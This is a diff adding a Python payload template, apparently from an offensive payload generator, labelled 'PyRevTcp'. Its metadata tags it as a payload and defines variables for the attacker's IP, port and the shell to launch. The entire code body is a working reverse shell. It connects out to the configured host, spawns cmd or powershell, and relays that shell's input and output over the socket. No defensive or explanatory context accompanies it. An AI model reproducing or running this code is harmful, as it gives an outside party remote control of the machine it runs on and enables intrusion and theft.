@@ -1,0 +1,40 @@
+#!name##PyRevTcp
+#!itemType##payload
+#!lang##python
+#!info##A basic and very small reverse shell TCP socket in Python. This is one of the most popular forms.
+#!itemTags##WIN##PyS
+#!Var##PRT_ip##$IP_ADDR##Host ip address.##str
+#!Var##PRT_port##4444##Host port number.##str
+#!Var##PRT_cmd##cmd##Specifies which console will be opened for the reverse connection. For example: 'cmd', 'powershell', etc.##str
+#!modProcess##BUILD_CODE
+
+import subprocess as sb, socket as sc, threading as th, os
+
+
+def recive(conn, shell):
+    while True:
+        recv = conn.recv(1024)
+        if recv:
+            shell.stdin.write(recv)
+            shell.stdin.flush()
+
+def send_loop(conn, shell):
+    while True:
+        conn.send(shell.stdout.read(1))
+
+
+sock = sc.socket(sc.AF_INET, sc.SOCK_STREAM)
+sock.connect(("{{PRT_ip}}", {{PRT_port}}))
+
+shell = sb.Popen(["{{PRT_cmd}}"], stdout=sb.PIPE, stderr=sb.STDOUT, stdin=sb.PIPE)
+
+send = th.Thread(target=send_loop, args=(sock, shell), daemon=True)
+send.start()
+
+recv = th.Thread(target=recive, args=(sock, shell), daemon=True)
+recv.start()
+
+try:
+    shell.wait()
+except KeyboardInterrupt:
+    sock.close()
